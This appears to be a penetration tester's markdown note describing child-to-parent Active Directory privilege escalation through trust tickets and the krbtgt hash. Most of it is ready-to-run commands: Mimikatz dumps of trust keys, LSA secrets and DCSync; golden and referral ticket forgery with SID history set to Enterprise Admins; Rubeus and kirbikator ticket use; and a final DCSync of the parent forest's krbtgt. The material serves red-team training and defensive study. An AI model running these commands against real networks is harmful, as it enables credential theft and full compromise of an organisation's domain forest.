---
tags:
  - privesc
title:
  - Child To Parent
---
![[child_to_parent_trust_flow.svg]]
1. Request TGT
2. Receive TGT
3. Show TGT, Request TGS for service outside domain
4. Receive inter-realm TGT which is encrypted by the Trust Key.
5. ***Request TGS***
6. Receive TGS
7. Present TGS for access
8. Opt Mutual Auth

We need the trust key to forge `5` and we need to modify sIDHistory to gain higher privileges.
- sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
- sIDHistory can be abused in two ways of escalating privileges within a forest:
	- krbtgt hash of the child
	- Trust Tickets
#### Using Trust Key

```powershell title:"Get trust key from DC"
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

```powershell title:"Get trust key using DCSync"
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\other-forest-account$"'
```

```powershell title:"Get trust key from LSA"
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

```batch title:"Forge an inter-realm TGT"
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:current.domain.name /sid:see_bloodhound /sids:see_bloodhound /rc4:ntlm_hash /service:krbtgt /target:domain.name /ticket:path_to_ticket.kirbi" "exit"
```

| Options                      | Description                                             |
| ---------------------------- | ------------------------------------------------------- |
| kerberos::golden             | Module name                                             |
| /domain:current_domain.name  | FQDN of the current domain                              |
| /sid:S-1-xxxxx               | SID of the current domain                               |
| /sids:domainsid,objectid     | SID of the enterprise admins group of the parent domain |
| /rc4:ntlm_hash               | RC4 of the trust key                                    |
| /user:Administrator          | User to impersonate                                     |
| /service:krbtgt              | Target service in the parent domain                     |
| /target:domain.name          | FQDN of the parent domain                               |
| /ticket:path_to_ticket.kirbi | Path where ticket is to be saved                        |
Using the trust ticket, we can request a TGS

```batch title:"Request a TGS with the service 'CIFS'"
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/other-forest-dc-fqdn
```

```batch title:"Request a TGS with the service 'HTTP'"
.\Rubeus.exe asktgs /ticket:path_to_tgtticket.kirbi /service:http/forest-dc.domain.name /dc:domain-controller-fqdn /ptt
```

Now, access the DC of the other forest. HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM can be created as well.

```batch title:"Use TGS to access the targeted service"
.\kirbikator.exe lsa .\CIFS.other-forest-dc-fqdn.kirbi
```

Now access the DC of the other forest

```batch title:"Forge a referral TGT"
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/current-domain-name /rc4:trust_key_ntlm /sid:current_domain /sids:S-1-XXXXX-519 /ldap /user:Administrator /nowrap
```

| Options             | Description                                             |
| ------------------- | ------------------------------------------------------- |
| silver              | Name of the module                                      |
| /rc4:ntlm           | NTLM hash of the trust key                              |
| /sid:domainsid      | SID of the current domain                               |
| /sids:S-1-XXXXX-519 | SID of the Enterprise Admins group of the parent domain |
| /ldap               | Retrieve PAC information from the current domain DC     |
| /user:Administrator | Username for which the TGT is generated                 |
| /nowrap             | No newlines in the output                               |

```batch title:"Use the forged ticket"
C:\AD\Tools\Rubeus.exe asktgs /service:servicename/other-forest-dc-fqdn /dc:other-forest-dc-fqdn /ptt /ticket:path_to_forged_ticket.kirbi
```

#### Using krbtgt hash

```powershell title:"Dump lsass"
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

```batch title:"Forge ticket using krbtgt hash"
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:current.domain.name /sid:current-domain-SID /sids:set SID history to enterprise admins /krbtgt:ntlm_hash /ptt" "exit"
```

```powershell title:"Pass the ticket on any machine of the current domain"
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
```

```batch title:"Demonstrate privileges on parent domain"
ls \\forest-dc.fqdn\C$
gwmi -class win32_operatingsystem -ComputerName forest-dc-fqdn
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:forest-name\krbtgt /domain:forest.name" "exit"
```

